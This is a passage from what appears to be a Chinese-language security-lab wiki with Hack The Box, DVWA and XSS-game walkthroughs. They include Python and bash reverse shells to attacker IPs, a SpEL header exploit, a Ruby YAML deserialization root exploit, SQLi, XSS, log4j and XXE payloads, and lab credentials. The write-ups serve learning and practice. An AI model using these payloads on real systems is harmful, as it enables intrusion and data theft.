os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);&quot;))# # 另一个命令行窗口 nc -lvvp 4444 进入后，有一个用户帐户“svc”，我可以得到“user.txt”。 $ cd /var/www/app $ pwd /var/www/app $ ls app.py templates $ ls -la total 20 drwxr-xr-x 4 www-data www-data 4096 Apr 3 14:32 . drwxr-xr-x 4 root root 4096 Apr 4 16:02 .. -rw-r--r-- 1 www-data www-data 1124 Dec 1 14:22 app.py drwxr-xr-x 8 www-data www-data 4096 May 15 21:06 .git drwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 templates $ cd .git $ ls -la total 52 drwxr-xr-x 8 www-data www-data 4096 May 15 21:06 . drwxr-xr-x 4 www-data www-data 4096 Apr 3 14:32 .. drwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 branches -rw-r--r-- 1 www-data www-data 15 Dec 1 14:35 COMMIT_EDITMSG -rw-r--r-- 1 www-data www-data 294 Dec 1 14:35 config -rw-r--r-- 1 www-data www-data 73 Dec 1 14:35 description -rw-r--r-- 1 www-data www-data 21 Dec 1 14:35 HEAD drwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 hooks -rw-r--r-- 1 root root 259 Apr 3 15:09 index drwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 info drwxr-xr-x 3 www-data www-data 4096 Dec 1 14:35 logs drwxr-xr-x 9 www-data www-data 4096 Dec 1 14:35 objects drwxr-xr-x 5 www-data www-data 4096 Dec 1 14:35 refs $ cat config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote &quot;origin&quot;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch &quot;main&quot;] remote = origin merge = refs/heads/main $ **config **文件中拿到用户名密码 username password svc jh1usoih2bkjaspwe92 使用 ssh svc@10.10.11.208 连接用户 svc 提权 svc$ sudo -S -l &gt; [sudo] password for svc: jh1usoih2bkjaspwe92 &gt; ... snip ... &gt; &gt; User svc may run the following commands on busqueda: &gt; (root) /usr/bin/python3 /opt/scripts/system-checkup.py * svc$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd &gt; Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2) &gt; &gt; docker-ps : List running docker containers &gt; docker-inspect : Inpect a certain docker container &gt; full-checkup : Run a full system checkup # 用户 svc 在 busqueda 上具有特权执行脚本 system-checkup.py 的能力 # 用户 svc 试图使用 sudo 执行 /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd 命令，其中 /etc/passwd 被作为参数传递给 system-checkup.py 脚本 # 脚本的用法提示 system-checkup.py 脚本支持以下动作选项： docker-ps：列出正在运行的 Docker 容器。 docker-inspect：检查特定的 Docker 容器。 full-checkup：运行完整的系统检查。 现在需要知道 full-chesckup 子命令的运行方式 创建一个脚本full-checkup.sh，将反向 shell 填充到里面以进行 root 权限升级 touch full-checkup.sh vim full-checkup.sh #!/usr/bin/python3 import socket import subprocess import os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&quot;10.10.16.8&quot;,4441)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) import pty pty.spawn(&quot;sh&quot;) chmod +x full-checkup.sh sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup nc -nlvp 4441 ls /root cat /root/root.txt","tags":[null],"categories":[null]},{"title":"DVWA 靶场","path":"/wiki/XSS-and-Security-Labs/DVWA-master.html","content":"参考： 小白网络安全入门之_DVWA全系列_哔哩哔哩_bilibili DVWA通关教程（上） DVWA 入门靶场学习记录 前言 https://github.com/digininja/DVWA 模块大榄 Brute Force（暴力破解） Command Injection（命令行注入） CSRF（跨站请求伪造） File Inclusion（文件包含） File Upload（文件上传） Insecure CAPTCHA（不安全的验证码） SQL Injection（SQL注入） SQL Injection (Blind)（SQL盲注） XSS (Reflected)（反射型跨站脚本） XSS (Stored)（存储型跨站脚本） DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容 通关开始 第一关-Brute Force LOW PHP 代码——查询验证用户名和密码 $query = &quot;SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';&quot;; PHP 代码——登录前的验证 # 请求不为空，查得到结果就行 if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; # 输出头像和用户名 $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; &#125; else &#123; 登录失败 &#125; SQL 在登录框中输入 admin' or '1' = '1 admin' or '1' = '2 SELECT * FROM `users` WHERE user = 'admin' or '1'='1' AND password = '' -- or 一个为真，即可为真 Medium PHP 代码 $user = mysql_real_escape_string( $user ); 单引号没有了，变成了转义\\ GET /DVWA-master/vulnerabilities/brute/?username=admin&amp;password=password&amp;Login=Login HTTP/1.1 High 多了token这个参数，过滤低级的爆破，校验 先抓包，火狐浏览器地址栏是明文的 GET /DVWA-master/vulnerabilities/brute/?username=amdin&amp;password=123&amp;Login=Login&amp;user_token=1884203513ab2b438bc4ec3182f62a65 HTTP/1.1 多了这一段 &amp;user_token=1884203513ab2b438bc4ec3182f62a65 点击 intercept is on 变成了 intercept is off 紧接着看网站浏览器的地址栏 http://localhost/DVWA-master/vulnerabilities/brute/?username=amdin&amp;password=123&amp;Login=Login&amp;user_token=1884203513ab2b438bc4ec3182f62a65# 接着开始改 Python 脚本 第二关-Command Injection LOW php 代码 &lt;?php if( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 网页输入 127.0.0.1 &amp;&amp; ipconfig Medium High 第三关-CSRF 跨站请求伪造，有人戏谑为借刀杀人，借用户之刀，做恶行之事也 LOW 映入眼帘的是一个修改密码的界面，输入密码之后123 123 后，在地址栏中观察到 从而得知这是 GET 型提交，且这就是修改密码的链接。我们直接在地址栏中修改密码456，然后复制链接重新打开一个界面（需要注意的是，打开的界面必须在同一个浏览器，原因是 cookie 认证） 如图所示显示密码已更改，同时原密码123失效了。 但显然，长而冗杂的链接是令人厌烦的，诱导用户点击的话，可以通过构造短链接的形式，直接搜索“在线 短链接”即可找到 如何查看重定向之前的链接呢，可以借用curl -i url Medium 和 Low 级别相比，增添了 referer 判断。 referer 作为 HTTP 头中的一个字段，记录了 HTTP 请求的来源地址。 通过输入密码 123，通过 burp 抓包看看。 重复上次的操作，重新打开一个界面，在 burp 中进行抓包，发现没有 referer 字段 接下来可以在 burp 中手动伪造 referer 来执行 CSRF 攻击 Referer: http://localhost/DVWA-master/vulnerabilities/csrf/ High 增加了 token 机制，当用户往服务器发送请求的时候，服务器通过校验请求是否携带正确的 Token，才会响应请求。 因为 GET 请求的参数会暴露在 URL 中，所以输入密码之后查看一下 token 第十关-XSS (DOM) Low document.write(&quot;&lt;option value='&quot; + lang + &quot;'&gt;&quot; + $decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;&quot;); // payload ?default=English &lt;script&gt;alert('XSS')&lt;/script&gt; Medium if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123; header (&quot;location: ?default=English&quot;); exit; // stripos() 函数 --&gt; 查找 &quot;&lt;script&quot; 在字符串（default 变量）中第一次出现的位置： // header函数 --&gt; Location类型的标头是一种特殊的header调用，常用来实现页面跳转。匹配通过将跳转 ?default=English // input 事件，制造一个 input 输入框，当 onclick 点击的时候触发 xss 攻击 ?default=English&lt;input onclick=alert('XSS') /&gt; High if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) &#123; # White list the allowable languages switch ($_GET['default']) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; // switch 语句 --&gt; 有选择地执行若干代码块之一 // !is_null --&gt; 检测变量是否不为 NULL。 // 如果 default 变量的值不为 French、English……这些，default 变量就重置为 ?default=English // 闭合 option 和 select 标签，然后使用 # 来注释 ?default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert('XSS')&gt; ?default=English#&lt;input onclick=alert('XSS') /&gt; 第十一关-XSS (Reflected) LOW // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user $html .= '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; &#125; // 从源代码中可看到没有对 name 做其他限制，只检测了 != null 且变量存在 // payload &lt;script&gt;alert('XSS')&lt;/script&gt; Medium if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // 从源代码中可以看到 &lt;script&gt; 标签进行了过滤，那就换个标签 // payload &lt;img src=x onerror=alert('XSS')&gt; High '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i' // 正则表达式过滤，script 不区分大小写，并且使用了通配符 * 匹配 // payload &lt;img src=x onerror=alert('XSS')&gt; 第十二关-XSS (Stored) LOW // payload Name: 1 Message: &lt;script&gt;alert('XSS')&lt;/script&gt; -- 从数据库中查看 mysql -u root -proot SHOW DATABASES; USE `dvwa` select * from guestbook; delete from guestbook; Medium // payload Name: &lt;Script&gt;alert('XSS')&lt;/script&gt; Message: www.sqlsec.com Name: &lt;s&lt;script&gt;cript&gt;alert('XSS')&lt;/script&gt; Message: www.sqlsec.com High // payload Name: &lt;img src=x onerror=alert('XSS')&gt; Message: www.sqlsec.com","tags":[null],"categories":[null]},{"title":"Google XSS Game","path":"/wiki/XSS-and-Security-Labs/Google XSS Game.html","content":"XSS game (xss-game.appspot.com) 这是一款谷歌的 XSS 游戏，总共有 6 个级别 Level 1 无需转义，直接编辑 URL 栏或者搜索框中都可以执行 &lt;script&gt;alert(1)&lt;/script&gt; Level 2 留言板中放入&lt;script&gt;alert(1)&lt;/script&gt;发现不弹窗，说明&lt;script&gt; 标签不起作用，转译成了HTML实体，可以选择其他能够触发 JavaScript 代码的命令 // 标签与属性一起使用，onerror 事件会在文档或图像加载过程中发生错误时被触发。 &lt;img src='#' onerror=alert(1) /&gt; Level 3 // 查看源代码 function chooseTab(num) &#123; // Dynamically load the appropriate image. var html = &quot;Image &quot; + parseInt(num) + &quot;&lt;br&gt;&quot;; html += &quot;&lt;img src='/static/level3/cloud&quot; + num + &quot;.jpg' /&gt;&quot;; $('#tabContent').html(html); // 用 ' 闭合 src 属性，用 /&gt; 闭合 img 标签 ' onerror='alert(1)'/&gt; Level 4 // 闭合 startTimer() 函数，用 , 连接写入 alert() 方法 // onload 事件在图片加载完成后立即执行 100'),alert('1 Level 5 // 这是基于 DOM 的 XSS，在邮件中插入 javascript:alert(1) // 插入后 &lt;a href=&quot;javascript:alert(1)&quot;&gt; Level 6 Data URL - HTTP | MDN (mozilla.org) 在浏览器中，有一些用于访问资源或脚本的协议，称作伪协议 data 伪协议 // Data URL，允许内容创建者向文档中嵌入小文件 data:text/javascript,alert(1)","tags":[null],"categories":[null]},{"title":"Inject — Hack The Box Machine","path":"/wiki/XSS-and-Security-Labs/Inject.html","content":"https://app.hackthebox.com/machines/Inject 参考： Google 搜索：Inject Hack The Box https://blog.csdn.net/qq_58869808/article/details/129505388 ^v^ (cnblogs.com) HTB-Inject_永远是深夜有多好。的博客-CSDN博客 视频： https://www.youtube.com/watch?v=SU_hAavi9Oo&amp;pp=ygURaW5qZWN0IGhhY2t0aGVib3g%3D 连接 使用环境 VM ubuntu sudo openvpn lab_Wreath0690.ovpn 10.10.11.204 侦查 # 初始端口扫描 nmap -A 10.10.11.204 # 仅有 22/tcp 和 8080/tcp 两个端口是开放的，其中22/tcp 端口运行的是 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)，8080/tcp 端口运行的是 Nagios NSCA touch png.png # 创建一个文件进行抓包 文件包含 FUZZ 路径，一层一层进行遍历，找到了 pom.xml 文件，发现 java 框架去 Google 搜索 EXP 密码：DocPhillovestoInject123 用户：phil # ssh phil@10.10.11.204，连接不上 # 执行命令 curl http://10.10.11.204:8080/show_image?img=pass1.jpg?pass=id 得到了文件的绝对路径 /var/www/WebApp/src/main/uploads/pass1.jpg%3Fpass=id &#123;&quot;timestamp&quot;:&quot;2023-05-19T02:46:22.638+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;URL [file:/var/www/WebApp/src/main/uploads/pass1.jpg%3Fpass=id] cannot be resolved in the file system for checking its content length&quot;,&quot;path&quot;:&quot;/show_image&quot;&#125;root@aloof-virtual-machine:/home/aloof/tools# 反向 shell 通过搜索找到 CVE 编号是「CVE-2022-22963」 CVE-2022-22963 是一个在 Spring Cloud Function 框架中存在的远程代码执行漏洞。它影响了3.1.6、3.2.2及更早的版本 当使用路由功能时，用户可以提供一个特制的 SpEL 作为路由表达式，可能导致远程代码执行和访问本地资源。 Vulhub - Docker-Compose file for vulnerability environment curl http://10.10.11.204:8080/show_image?img=../../../../WebApp/pom.xml # 返回信息，版本满足要求 &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.5&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; 使用 burp 抓http://10.10.11.204:8080的数据包 GET / HTTP/1.1 Host: 10.10.11.204:8080 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Vulhub 上的 POST /functionRouter HTTP/1.1 Host: localhost:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Connection: close spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/success&quot;) Content-Type: text/plain Content-Length: 4 test 修改后 https://www.revshells.com/ bash -i &gt;&amp; /dev/tcp/10.10.16.39/9001 0&gt;&amp;1 # 通过 base64 加密 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE= # 监听端口，获得 shell 权限 nc -nvlp 9001 修改后的请求包 POST /functionRouter HTTP/1.1 Host: 10.10.11.204:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept: */* Accept-Language: en Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;) Content-Type: text/plain Content-Length: 4 test spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;) # 这段代码是一个 HTTP 请求头的参数，它的名字是 spring.cloud.function.routing-expression，它的值是一个SpEL表达式。SpEL表达式是一种可以执行任意Java代码的语言. # 这个SpEL表达式的作用是调用java.lang.Runtime类的getRuntime()方法，得到一个Runtime对象，然后调用它的exec()方法，执行一个命令行。这个命令行是我们自己可以控制的地方 bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; # 这个命令行的作用是先用 echo 命令输出一串 base64 编码的字符串，然后用 base64 命令解码它，然后用 bash 命令执行它 bash -i &gt;&amp; /dev/tcp/10.10.16.39/9001 0&gt;&amp;1 # 这个命令的作用是启动一个交互式的 bash shell，并且把它的输入和输出重定向到一个TCP连接上，连接的目标地址是 10.10.16.39:9001。这样就相当于在服务器上开启了一个反向 shell，攻击者可以在 10.10.16.39:9001 上监听并控制服务器。 # 所以，这段代码的目的是利用 Spring Cloud Function 框架中存在的 SpEL 注入漏洞，执行任意代码，并在服务器上开启一个反向 shell，从而获取服务器的完全控制权。 # 连接上之后，通过 whoami 命令发现当前用户是 frank，切换到 phil 用户 密码：DocPhillovestoInject123 用户：phil su phil # 在 /home/phil 目录下发现 user.txt 文件，用 cat 读取文件 提权 使用 sudo -l 发现没有提权的命令 ansible playbook代码来执行shell命令。 Ansible playbook 是一种用来在远程主机上执行一系列任务的文件，它使用YAML语法1。使用Ansible playbook来执行shell命令 - hosts: localhost tasks: - name: getroot command: sudo chmod u+s /bin/bash Playbook 用于将 /bin/bash 文件设置为 SUID 权限，以实现以 root 用户权限执行 Bash shell 的目的 ifconfig # 用sudo权限运行python3的http.server模块1，它可以在本地主机上启动一个简单的HTTP服务器，用来共享文件和目录。 sudo python3 -m http.server # 用wget命令从10.10.16.39:8000这个地址下载playbook_2.yml文件，这个地址是上面的HTTP服务器提供的。 wget 10.10.16.39:8000/playbook_2.yml bash -p id whoami cd /root ls cat root.txt","tags":[null],"categories":[null]},{"title":"MonitorsTwo — Hack The Box Machine","path":"/wiki/XSS-and-Security-Labs/MonitorsTwo.html","content":"介绍 破解盒子 ：： 破解盒子 (hackthebox.com) 10.10.11.211 参考 hackthebox MonitorsTwo渗透全过程 - YouTube htb monitorstwo wp记录_春猿火的博客-CSDN博客 MonitorsTwo WriteUp_Som3B0dy的博客-CSDN博客 FredBrave/CVE-2022-46169-CACTI-1.2.22：这是 CVE-2022-46169 对仙人掌 1.2.22 的攻击。此漏洞允许通过 RCE 获取计算机上的反向外壳。 (github.com) UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091 (github.com) 探测 nmap -A 10.10.11.211 底部看到版本信息——版本 1.2.22 | © 2004-2023 - The Cacti Group Google 搜索：The Cacti Group exploit CVE-2022-46169 反连 shell # 监听 nc -nlvp 443 # 本机 git clone 把 python 脚本下载下载并且运行 python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.29 --LPORT=443 #-u http://10.10.11.211: 指定目标 URL 为 http://10.10.11.211。测试的目标网站 #--LHOST=10.10.14.29: 指定本地主机的 IP 地址为 10.10.14.29。反向连接的 IP 地址。 -#-LPORT=443: 指定本地主机的端口号为 443。接收反向连接的端口号。 cd / cat entrypoint.sh #!/bin/bash set -ex wait-for-it db:3306 -t 300 -- echo &quot;database is connected&quot; if [[ ! $(mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot;) =~ &quot;automation_devices&quot; ]]; then mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql mysql --host=db --user=root --password=root cacti -e &quot;UPDATE user_auth SET must_change_password='' WHERE username = 'admin'&quot; mysql --host=db --user=root --password=root cacti -e &quot;SET GLOBAL time_zone = 'UTC'&quot; fi chown www-data:www-data -R /var/www/html # first arg is `-f` or `--some-option` if [ &quot;$&#123;1#-&#125;&quot; != &quot;$1&quot; ]; then set -- apache2-foreground &quot;$@&quot; fi exec &quot;$@&quot; # ------------------------------------------------------------------------------------------------- # 这个脚本的功能是等待数据库可用后，检查指定的表是否存在，如果不存在，则导入 SQL 文件并更新数据库中的记录。然后设置目录权限并执行传递给脚本的命令行参数。 find / -perm -u=s 2&gt;/dev/null # find: 命令用于在文件系统中查找文件和目录。 # /: 指定查找的起始路径为根目录。 # -perm -u=s: 指定查找具有 Setuid 权限的文件。-perm 选项用于指定文件权限，-u 表示针对文件所有者的权限，=s 表示设置了 Setuid 权限的文件。 # 2&gt;/dev/null: 将错误输出重定向到 /dev/null，即丢弃错误信息，以避免显示不必要的错误提示。 /sbin/capsh --gid=0 --uid=0 -- # 以 root 用户的身份运行 /sbin/capsh 工具，以便在修改进程权限和能力时拥有 root 权限 whoami # 复制 entrypoint.sh 文件的命令 mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot; mysql --host=db --user=root --password=root cacti -e &quot;select * from user_auth&quot; # 找到 marcus 用户的密码 $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C # 本机 hashcat -m 3200 -a 0 pass.txt /home/aloof/zidm/common-password-list/rockyou.txt # 使用 hashcat 工具对 `pass.txt` 文件中的 bcrypt 哈希值进行直接字典攻击，并使用 `/home/aloof/zidm/common-password-list/rockyou.txt` 字典文件 ssh marcus@10.10.11.211 $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C 用户名 密码 明文 marcus $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C funkymonkey # www-data 用户 cd / cd bin ls -al | grep bash chmod u+s bash UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091 (github.com) # 本机 git clone https://github.com/UncleJ4ck/CVE-2021-41091.git ifconfig sudo python3 -m http.server # marcus ./exp.sh chmod +x exp.sh","tags":[null],"categories":[null]},{"title":"Precious — Hack The Box Machine","path":"/wiki/XSS-and-Security-Labs/Precious.html","content":"介绍 在虚拟机中进行连接 sudo openvpn 名称.ovpn 出现 Initialization Sequence Completed 代表连接成功 连接 参考： 主要参考——Hackthebox - Precious(Easy) - YouTube PreciousHTB | Hack The Box Precious| PreciousWriteUp | Hack The Box - YouTube Precious- YouTube 中等 (medium.com) Hackthebox PreciousWriteup – 0xDedinfosec Precious是 Hack the Box 上的一台简单机器，它托管了一个使用易受攻击的 pdfkit 版本的网站。使用此版本的 pdf kit 和 CVE-2022–25765，我们能够以 ruby 用户的身份获得计算机的反向 shell。然后，我们从配置文件中收集一些信息，以将我们的权限提升给其他用户。一旦我们成为用户 henry，我们就通过 YAML 反序列化使用远程代码执行将我们的权限提升给根用户。 地址：https://app.hackthebox.com/machines/513 10.10.11.189 常规探测 # nmap 全端口扫描，发现开放了 22 和 80 端口，分别是 ssh 和 http 协议 # -sC：运行端口侦测的默认 Nmap 脚本 # -sV：探测开放端口以确定服务/版本信息 nmap -sC -sV 10.10.11.189 10.10.11.189:22 10.10.11.189:80 网站能够输入一个 URL，它会将网页转换为 pdf exiftool iza6l21cttk715syc00tn5uzd4t4hgqz.pdf Google 直接搜索 pdfkit v0.8.6 vuln、pdfkit v0.8.6 exploit（意思就是搜索和 pdfkit v0.8.6 相关的漏洞 ） Command Injection in pdfkit | CVE-2022-25765 | Snyk ==找到了 PoC，把要执行的命令放在``中== 反弹 shell https://www.revshells.com/ # 需要设置一个侦听器，以便在获得反向 shell 后与机器进行交互。 nc -nlvp 1113 # 构造一个 payload python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.13&quot;,1113));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)' # 放入浏览器 http://10.10.16.13?name=#&#123;'%20`放入 payload`'&#125; http://10.10.16.13?name=#&#123;'%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.13&quot;,1113));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)'`'&#125; 输入whoami，将会显示rudy 提权 # ssh 登录 ssh henry@10.10.11.189 # 密码： Q3c1AqGHtoI0aXAYFH cat user.txt 得到 flag 现在可以访问用户 henry，试一下可以用 root 权限运行吗，利用sudo -l -bash-5.1$ sudo -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb -bash-5.1$ 通过 YAML 远程执行代码的文章，发现可以通过 dependencies.yml 文件使用远程代码注入，该文件将由 /opt/update_dependencies.rb 运行 根据 sudo -l 命令的返回结果 这说明你的目标机器上的用户 henry 可以使用 sudo 命令来以 root 权限运行以下命令，而不需要输入密码： /usr/bin/ruby /opt/update_dependencies.rb 复制 这可能是一个提权的机会，如果你可以控制或者修改 /opt/update_dependencies.rb 这个文件，或者利用 ruby 的特性来执行任意命令。你可以尝试以下方法： cat /opt/update_dependencies.rbcat # 发现 YAML.load(File.read(&quot;dependencies.yml&quot; )) 字段 test file .yml 使用 nano 编辑器 在 nano 编辑器中，按下 Ctrl+O 组合键，这会提示你输入要保存的文件名。如果你不想改变文件名，直接按下 Enter 键即可。 如果你想要退出 nano 编辑器，按下 Ctrl+X 组合键，这会提示你是否要保存修改。如果你想要保存，按下 Y 键，然后按下 Enter 键。如果你不想要保存，按下 N 键。 # 将 /tmp/1 添加到 PATH，您可以使系统能够在该目录中查找并执行命令。 export PATH=/tmp/1:$PATH echo $PATH Google 搜索：file yml rce https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/ https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e56 --- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module 'Kernel' method_id: :system git_set: sh method_id: :resolve # 执行我们的命令 sudo /usr/bin/ruby /opt/update_dependencies.rb pwd;id;whoami;ls -la;file root.txt","tags":[null],"categories":[null]},{"title":"已知漏洞复现与验证","path":"/wiki/XSS-and-Security-Labs/Reproducible vulnerability.html","content":"以下是一些已知的漏洞及其相关信息，供研究和复现使用 CVE-2019-6341✔ 在 kali 上使用 vulhub 环境，先进入目录vulhub/drupal/CVE-2019-6341 # 启动 docker，启用环境 sudo service docker start docker-compose up -d 在浏览器访问：http://127.0.0.1:8080 # 上传 POC php blog-poc.php 127.0.0.1 8080 # 访问，FireFox 过滤了 XSS，所以不弹窗 http://127.0.0.1:8080/sites/default/files/pictures/2023-02/_0 漏洞利用 drupal 文件上传模块，文件内容是 HTML 代码，但 JS 代码包含其中 &lt;SCRIPT&gt;alert(123);&lt;/SCRIPT&gt; CVE 2014-4210✔ vulhub/weblogic/ssrf at master · vulhub/vulhub (github.com) 在 kali 上使用 vulhub 环境，先进入目录vulhub/weblogic/ssrf # 启动 docker，启用环境 sudo service docker start docker-compose up -d Weblogic 中存在一个 SSRF 漏洞，利用该漏洞可以发送任意 HTTP 请求，进而攻击内网中 redis、fastcgi 等脆弱组件。 访问http://127.0.0.1:7001/uddiexplorer/，查看 uddiexplorer 应用。 点击 Search Public Registries 进行抓包 未完…… thinkcmf-x1.6.0-x2.2.3✔ ThinkCMF 是一个基于 ThinkPHP 框架开发的内容管理框架。可利用此漏洞构造恶意的url，向服务器写入任意内容的文件，达到远程代码执行的目的 下载ThinkCMF2.2.2版本，X2.2.2 ·ThinkCMF/CMFX (github.com)，解压后放到 phpstudy 环境的 web 根目录下 然后，输入数据库密码 root，设置用户名、密码、邮箱等完成安装设置 log4j2-cve-2021-44228✔ 环境搭建 使用 vulhub，切换到漏洞目录 cd /root/vulhub/log4j/CVE-2021-44228 漏洞复现 先利用 dnslog 查看回显，然后测试网站 http://127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://f4ae3u.dnslog.cn&#125; 工具使用https://github.com/bkfish/Apache-Log4j-Learning/ git clone https://github.com/bkfish/Apache-Log4j-Learning.git 构造 payload 使用 base 64加密 bash -i &gt;&amp; /dev/tcp/192.168.31.137/8983 0&gt;&amp;1 …… XXE 漏洞 | rrodrigo/xxelab✔ 环境搭建 # 下载镜像 docker pull rrodrigo/xxelab docker run -d -p 8082:80 rrodrigo/xxelab 将主机的 8082 端口映射到容器的 80 端口上，在浏览器中访问映射出来的端口，http://localhost:8082 漏洞复现 通过用 burp 抓包发现是 xml 格式 &lt;!DOCTYPE c [ &lt;!ENTITY file SYSTEM &quot;/etc/passwd&quot;&gt; ]&gt; # 定义了一个名为 file 的实体，它的值是 /etc/passwd，这是一个包含系统用户信息的文件。 Tips / 提示 在 XML 中，实体是可以被引用的对象，类似于变量。当 XML 解析器解析包含该实体的 XML 文档时，它会将实体引用替换为实体的实际值。攻击者可以构造恶意的 XML 数据，将实体引用插入到数据中，从而让 XML 解析器读取和输出 /etc/passwd 文件的内容。 CVE-2017-12615（tomcat-pass-getshell） 环境搭建 使用 vuluhub 的 docker 进行漏洞复现 